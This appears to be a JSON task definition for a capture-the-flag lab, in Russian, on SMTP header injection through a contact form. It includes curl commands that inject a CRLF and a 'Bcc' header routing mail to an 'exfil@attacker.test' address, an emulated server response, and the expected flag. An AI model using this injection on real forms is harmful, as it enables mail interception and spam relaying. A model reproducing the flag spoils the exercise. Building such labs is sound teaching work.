@@ -1,0 +1,37 @@
+{
+  "id": "web-email-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{smtp_h34d3r_1nj3ct10n_bcc}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SMTP-инъекция\n\nФорма POST /contact ставит поле email в заголовок To письма без фильтрации CRLF.\nДобейся, чтобы письмо ушло на скрытый адрес-эксфильтратор, и прочитай его.\n\n1. Обычная отправка:\n   curl -s -X POST 'https://app.target/contact' --data 'email=me@example.com&message=hi'\n2. Вставь перевод строки и Bcc:\n   curl -s -X POST 'https://app.target/contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test&message=hi'\n3. Сервер вернёт адрес скрытого получателя (флаг) — запиши его в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/contact)",
+      "cases": [
+        {
+          "match": "Bcc:|%0a|%0A",
+          "example": "-X POST '.../contact' --data-binary 'email=me@example.com%0aBcc:exfil@attacker.test'",
+          "output": "OK: message sent\naccepted recipients: me@example.com, nto{smtp_h34d3r_1nj3ct10n_bcc}\n"
+        },
+        {
+          "match": "contact",
+          "example": "-X POST '.../contact' --data 'email=me@example.com&message=hi'",
+          "output": "OK: message sent\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только указанный эндпоинт.\n"
+    }
+  }
+}
